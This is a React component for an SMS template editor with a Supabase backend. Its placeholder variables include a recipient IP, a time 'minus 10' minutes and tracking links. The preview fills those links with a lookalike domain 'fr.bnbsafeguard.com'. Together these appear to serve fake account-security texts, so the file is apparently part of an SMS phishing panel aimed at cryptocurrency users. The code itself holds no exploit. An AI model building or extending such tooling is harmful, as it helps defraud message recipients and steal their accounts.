
import React, { useState } from 'react';
import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Label } from '@/components/ui/label';
import { Textarea } from '@/components/ui/textarea';
import { Badge } from '@/components/ui/badge';
import { ArrowLeft, Eye, MessageSquare, Save } from 'lucide-react';
import { useMutation, useQueryClient } from '@tanstack/react-query';
import { supabase } from '@/integrations/supabase/client';
import { useToast } from '@/hooks/use-toast';

interface SMSTemplateEditorProps {
  template?: any;
  onCancel: () => void;
}

const SMSTemplateEditor = ({ template, onCancel }: SMSTemplateEditorProps) => {
  const { toast } = useToast();
  const queryClient = useQueryClient();
  const [name, setName] = useState(template?.name || '');
  const [content, setContent] = useState(template?.content || '');
  const [variables] = useState(['{{name}}', '{{first_name}}', '{{phone}}', '{{current_ip}}', '{{link}}', '{{home_link}}', '{{current_time_minus_10}}']);
  const [isPreview, setIsPreview] = useState(false);

  const saveTemplateMutation = useMutation({
    mutationFn: async (templateData: any) => {
      if (template) {
        const { error } = await supabase
          .from('sms_templates')
          .update(templateData)
          .eq('id', template.id);
        if (error) throw error;
      } else {
        const { error } = await supabase
          .from('sms_templates')
          .insert([templateData]);
        if (error) throw error;
      }
    },
    onSuccess: () => {
      queryClient.invalidateQueries({ queryKey: ['sms-templates'] });
      toast({
        title: "Success",
        description: template ? "Template updated successfully" : "Template created successfully",
      });
      onCancel();
    },
    onError: (error) => {
      console.error('Save error:', error);
      toast({
        title: "Error",
        description: "Failed to save template. Please try again.",
        variant: "destructive",
      });
    },
  });

  const handleSave = () => {
    if (!name.trim() || !content.trim()) {
      toast({
        title: "Error",
        description: "Please fill in all required fields",
        variant: "destructive",
      });
      return;
    }

    if (content.length > 160) {
      toast({
        title: "Warning",
        description: "SMS content is longer than 160 characters. It may be sent as multiple messages.",
        variant: "destructive",
      });
    }

    saveTemplateMutation.mutate({
      name: name.trim(),
      content: content.trim(),
      variables,
    });
  };

  const insertVariable = (variable: string) => {
    const textarea = document.getElementById('sms-content') as HTMLTextAreaElement;
    if (textarea) {
      const start = textarea.selectionStart;
      const end = textarea.selectionEnd;
      const newContent = content.substring(0, start) + variable + content.substring(end);
      setContent(newContent);
      
      // Restore cursor position
      setTimeout(() => {
        textarea.focus();
        textarea.setSelectionRange(start + variable.length, start + variable.length);
      }, 0);
    }
  };

  const getPreviewContent = () => {
    let preview = content;
    const now = new Date();
    const timeMinus10 = new Date(now.getTime() - 10 * 60 * 1000);
    const formattedTime = timeMinus10.toISOString().replace('T', ' ').replace(/\.\d{3}Z$/, ' UTC');
    
    preview = preview.replace(/{{name}}/g, 'John Doe');
    preview = preview.replace(/{{first_name}}/g, 'John');
    preview = preview.replace(/{{phone}}/g, '+1234567890');
    preview = preview.replace(/{{current_ip}}/g, '192.168.1.100');
    preview = preview.replace(/{{link}}/g, 'https://fr.bnbsafeguard.com/?=SAMPLE123');
    preview = preview.replace(/{{home_link}}/g, 'https://fr.bnbsafeguard.com/?=3452');
    preview = preview.replace(/{{current_time_minus_10}}/g, formattedTime);
    return preview;
  };

  return (
    <div>
      <div className="flex items-center gap-4 mb-6">
        <Button
          variant="outline"
          onClick={onCancel}
          className="border-gray-600 text-gray-300 hover:bg-gray-600"
        >
          <ArrowLeft className="h-4 w-4 mr-2" />
          Back
        </Button>
        <h1 className="text-2xl font-bold text-yellow-400">
          {template ? 'Edit SMS Template' : 'Create SMS Template'}
        </h1>
      </div>

      <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
        <div className="lg:col-span-2">
          <Card className="bg-gray-800 border-gray-700">
            <CardHeader>
              <CardTitle className="text-white">Template Details</CardTitle>
            </CardHeader>
            <CardContent className="space-y-4">
              <div>
                <Label htmlFor="name" className="text-gray-300">Template Name *</Label>
                <Input
                  id="name"
                  value={name}
                  onChange={(e) => setName(e.target.value)}
                  placeholder="Enter template name"
                  className="bg-gray-700 border-gray-600 text-white"
                />
              </div>

              <div>
                <div className="flex items-center justify-between mb-2">
                  <Label htmlFor="sms-content" className="text-gray-300">SMS Content *</Label>
                  <div className="flex gap-2">
                    <Button
                      size="sm"
                      variant={!isPreview ? "default" : "outline"}
                      onClick={() => setIsPreview(false)}
                      className="text-xs"
                    >
                      <MessageSquare className="h-3 w-3 mr-1" />
                      Edit
                    </Button>
                    <Button
                      size="sm"
                      variant={isPreview ? "default" : "outline"}
                      onClick={() => setIsPreview(true)}
                      className="text-xs"
                    >
                      <Eye className="h-3 w-3 mr-1" />
                      Preview
                    </Button>
                  </div>
                </div>
                
                {!isPreview ? (
                  <div>
                    <Textarea
                      id="sms-content"
                      value={content}
                      onChange={(e) => setContent(e.target.value)}
                      placeholder="Enter SMS content"
                      className="bg-gray-700 border-gray-600 text-white min-h-[150px]"
                    />
                    <div className="flex justify-between items-center mt-2 text-sm">
                      <span className={`${content.length > 160 ? 'text-red-400' : 'text-gray-400'}`}>
                        {content.length}/160 characters
                      </span>
                      {content.length > 160 && (
                        <span className="text-red-400">
                          Will be sent as {Math.ceil(content.length / 160)} messages
                        </span>
                      )}
                    </div>
                  </div>
                ) : (
                  <div className="bg-gray-700 border border-gray-600 rounded-md p-3 min-h-[150px] text-white">
                    <div className="bg-gray-600 rounded-lg p-3 max-w-xs">
                      {getPreviewContent()}
                    </div>
                  </div>
                )}
              </div>

              <div className="flex gap-4 pt-4">
                <Button
                  onClick={handleSave}
                  disabled={saveTemplateMutation.isPending}
                  className="bg-yellow-600 hover:bg-yellow-700 text-black"
                >
                  <Save className="h-4 w-4 mr-2" />
                  {saveTemplateMutation.isPending ? 'Saving...' : 'Save Template'}
                </Button>
                <Button
                  variant="outline"
                  onClick={onCancel}
                  className="border-gray-600 text-gray-300 hover:bg-gray-600"
                >
                  Cancel
                </Button>
              </div>
            </CardContent>
          </Card>
        </div>

        <div>
          <Card className="bg-gray-800 border-gray-700">
            <CardHeader>
              <CardTitle className="text-white">Available Variables</CardTitle>
            </CardHeader>
            <CardContent>
              <p className="text-gray-400 text-sm mb-4">
                Click on any variable to insert it into your template
              </p>
              <div className="space-y-2">
                {variables.map((variable) => (
                  <Badge
                    key={variable}
                    variant="outline"
                    className="cursor-pointer border-gray-500 text-gray-300 hover:bg-gray-600 block w-full justify-start"
                    onClick={() => insertVariable(variable)}
                  >
                    {variable}
                  </Badge>
                ))}
              </div>
            </CardContent>
          </Card>
        </div>
      </div>
    </div>
  );
};

export default SMSTemplateEditor;
